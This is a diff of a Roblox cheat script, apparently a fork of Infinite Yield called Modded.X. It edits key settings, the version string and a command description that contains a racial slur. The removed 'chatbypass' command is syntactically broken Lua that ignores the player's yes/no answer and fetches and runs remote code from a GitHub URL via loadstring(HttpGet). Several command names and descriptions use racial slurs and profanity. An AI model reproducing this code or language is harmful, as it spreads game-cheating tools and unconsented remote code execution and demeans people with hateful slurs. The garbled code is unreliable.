@@ -15,7 +15,11 @@
          ██║╚██╔╝██║██╔══██║██║  ██║██╔══╝      ██╔══██╗  ╚██╔╝      ██╔══██║██║     ██╔══╝   ██╔██╗ 
          ██║ ╚═╝ ██║██║  ██║██████╔╝███████╗    ██████╔╝   ██║       ██║  ██║███████╗███████╗██╔╝ ██╗
          ╚═╝     ╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝    ╚═════╝    ╚═╝       ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝    
--- [[
+ 
+ getgenv().ModdedX = { 
+     ["Key"] = "Your Key Here",
+     ["Enabled"] = true,
+--]] 
 
 if IY_LOADED and not _G.IY_DEBUG == true then
     -- error("Modded.X is already running!", 0)
@@ -36,7 +40,7 @@ if not game:IsLoaded() then
     notLoaded:Destroy()
 end
 
-currentVersion = "x2.1"
+currentVersion = "(C) 0.1"
 
 Holder = Instance.new("Frame")
 Title = Instance.new("TextLabel")
@@ -4776,7 +4780,7 @@ CMDs[#CMDs + 1] = {NAME = 'listento [player]', DESC = 'Listens to the area aroun
 CMDs[#CMDs + 1] = {NAME = 'unlistento', DESC = 'Disables listento'}
 CMDs[#CMDs + 1] = {NAME = 'jerk', DESC = 'Makes you jork it'}
 CMDs[#CMDs + 1] = {NAME = 'emptyserver', DESC = 'makes you join an empty server'}
-CMDs[#CMDs + 1] = {NAME = 'nigker', DESC = 'chat bypass lmao - key is patchmeplease'}
+CMDs[#CMDs + 1] = {NAME = 'nigker', DESC = 'fuck off nigga!!'}
 wait()
 
 for i = 1, #CMDs do
@@ -7870,38 +7874,6 @@ addcmd('setfpscap', {'fpscap', 'maxfps'}, function(args, speaker)
 		end
 	else
 		return notify('Incompatible Exploit', 'Your exploit does not support this command (missing setfpscap)')
-	end
-end)
-
-addcmd('chatbypass', {'nigker', 'nigka'}, function(args, speaker)
-local function showNotification(title, text)
-    local player = game.Players.LocalPlayer
-    game.StarterGui:SetCore("SendNotification", {
-        Title = title, 
-        Text = do you wish to proceed? Type yes or no.,    
-        Icon = "",      
-        Duration = 5    
-    })
-end
- local chatMessage = player.Chatted:Connect(function(msg)
-        if msg:lower() == "yes" then
-            onYes()
-        elseif msg:lower() == "no" then
-            onNo()
-        end
-    end)
-end
-showNotification("Important Notice", "Do you wish to proceed? Type 'yes' or 'no'.")
-local function showNotification(title, text)
-    local player = game.Players.LocalPlayer
-    game.StarterGui:SetCore("SendNotification", {
-        Title = title,  
-        Text = who cares ill still load it lol. the key is "patchmeplease",    
-        Icon = "",      
-        Duration = 5     
-    })
-end
-	loadstring(game:HttpGet('https://raw.githubusercontent.com/cheatplug/usercreated/refs/heads/main/main.lua'))()
 	end
 end)
 
